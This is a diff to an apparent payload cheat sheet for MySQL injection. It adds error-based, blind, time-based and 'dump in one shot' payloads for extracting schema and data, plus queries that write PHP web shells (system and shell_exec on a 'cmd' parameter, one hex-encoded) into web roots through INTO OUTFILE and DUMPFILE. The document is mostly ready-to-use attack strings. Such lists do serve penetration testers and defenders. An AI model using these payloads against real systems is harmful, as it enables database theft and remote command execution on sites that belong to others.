@@ -18,10 +18,14 @@
     * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make-set)
     * [MYSQL Blind with LIKE](#mysql-blind-with-like)
 * [MYSQL Time Based](#mysql-time-based)
+    * [Using SLEEP in a subselect](#using-asleep-in-a-subselect)
+    * [Using conditional statements](#using-conditional-statements)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
 * [MYSQL Current queries](#mysql-current-queries)
 * [MYSQL Read content of a file](#mysql-read-content-of-a-file)
 * [MYSQL Write a shell](#mysql-write-a-shell)
+    * [Into outfile method](#into-outfile-method)
+    * [Into dumpfile method](#into-dumpfile-method)
 * [MYSQL UDF command execution](#mysql-udf-command-execution)
 * [MYSQL Truncation](#mysql-truncation)
 * [MYSQL Out of band](#mysql-out-of-band)
@@ -148,11 +152,11 @@ Shorter to read:
 Works with `MySQL >= 5.1`
 
 ```sql
-AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
-AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
-AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
-AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
-AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
 ```
 
 ## MYSQL Blind
@@ -165,6 +169,8 @@ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)
 ?id=1 and left(version(),1)=4
 ?id=1 and ascii(lower(substr(Version(),1,1)))=51
 ?id=1 and (select mid(version(),1,1)=4)
+?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
+?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 ```
 
 ### MYSQL Blind using a conditional statement
@@ -204,24 +210,62 @@ SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
 
 ## MYSQL Time Based
 
+The following SQL codes will delay the output from MySQL.
+
 ```sql
 +BENCHMARK(40000000,SHA1(1337))+
 '%2Bbenchmark(3200,SHA1(1))%2B'
-' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
-
 AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
 RLIKE SLEEP([SLEEPTIME])
 OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+```
 
-?id=1 and IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
-?id=1 and IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
+### Using SLEEP in a subselect
+
+```powershell
+1 and (select sleep(10) from dual where database() like '%')#
+1 and (select sleep(10) from dual where database() like '___')# 
+1 and (select sleep(10) from dual where database() like '____')#
+1 and (select sleep(10) from dual where database() like '_____')#
+1 and (select sleep(10) from dual where database() like 'a____')#
+...
+1 and (select sleep(10) from dual where database() like 's____')#
+1 and (select sleep(10) from dual where database() like 'sa___')#
+...
+1 and (select sleep(10) from dual where database() like 'sw___')#
+1 and (select sleep(10) from dual where database() like 'swa__')#
+1 and (select sleep(10) from dual where database() like 'swb__')#
+1 and (select sleep(10) from dual where database() like 'swi__')#
+...
+1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
+```
+
+### Using conditional statements
+
+```sql
+?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
+?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
+?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
 ```
 
 ## MYSQL DIOS - Dump in One Shot
 
 ```sql
 (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
+
 (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
+
+-- SecurityIdiots
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+-- Profexer
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+
+-- Dr.Z3r0
+(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
+
+-- M@dBl00d
+(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
 ```
 
 ## MYSQL Current queries
@@ -251,12 +295,20 @@ GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
 
 ## MYSQL Write a shell
 
+### Into outfile method
+
 ```sql
-SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
-SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
--1 UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
 [...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
 [...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+```
+
+### Into dumpfile method
+
+```sql
+[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
 ```
 
 ## MYSQL Truncation
@@ -325,3 +377,4 @@ load data infile '\\\\error\\abc' into table database.table_name;
 - [HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman](https://hackerone.com/reports/508123)
 - [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
 - [ekoparty web_100 - 2016/10/26 - p4-team](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
+- [Websec - MySQL - Roberto Salgado - May 29, 2013.](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
